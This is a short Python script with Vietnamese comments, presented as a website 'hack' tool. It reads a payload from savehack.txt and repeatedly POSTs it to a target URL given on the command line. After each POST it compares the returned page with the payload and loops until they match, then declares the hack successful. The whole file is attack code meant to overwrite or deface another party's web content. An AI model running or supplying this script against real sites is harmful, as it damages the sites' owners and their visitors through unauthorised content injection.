import requests
import time
import sys
import os

# Màu sắc
G = '\033[0;32m'
R = '\033[0;31m'
Y = '\033[0;33m'
NC = '\033[0m'

def load_savehack():
    """Đọc nội dung đã chỉnh sửa từ savehack.txt"""
    try:
        with open("savehack.txt", "r", encoding="utf-8") as f:
            return f.read().strip()
    except FileNotFoundError:
        print(f"{R}[!] Lỗi: Không tìm thấy file savehack.txt{NC}")
        return None

def attack():
    if len(sys.argv) < 2:
        print(f"{R}[!] Thiếu URL mục tiêu.{NC}")
        return

    target = sys.argv[1]
    
    # Bước 1: Lấy 'Bản mẫu' từ file savehack.txt
    my_payload = load_savehack()
    if not my_payload: return

    print(f"{G}=== ĐANG BẮT ĐẦU QUY TRÌNH OVERWRITE ==={NC}")
    print(f"[*] Mục tiêu: {target}")
    
    while True:
        try:
            # Bước 2: Tấn công tiêm văn bản code
            # Tool sẽ gửi toàn bộ nội dung trong savehack.txt đi
            requests.post(target, data={'content': my_payload}, timeout=5)
            
            # Bước 3: Sao chép toàn bộ HTML hiện tại của web mục tiêu để đối chiếu
            response = requests.get(target, timeout=5)
            current_web_code = response.text.strip()

            # Bước 4: So sánh tuyệt đối (Xác thực không hiểu lầm)
            if my_payload == current_web_code:
                print(f"\n{G}[██████████] 100% - HACK THÀNH CÔNG!{NC}")
                print(f"{G}[✓] Web hiện tại đã khớp hoàn toàn với savehack.txt.{NC}")
                break
            else:
                # Nếu không giống (kể cả lệch 1 dấu cách), tiếp tục tấn công
                print(f"{Y}[!] Đang đồng bộ hóa code... (Vẫn còn sai lệch){NC}", end='\r')
            
            time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{R}[!] Đã dừng tấn công.{NC}")
            break
        except Exception as e:
            print(f"\n{R}[!] Lỗi kết nối: {e}. Thử lại...{NC}")
            time.sleep(2)

if __name__ == "__main__":
    attack()
    
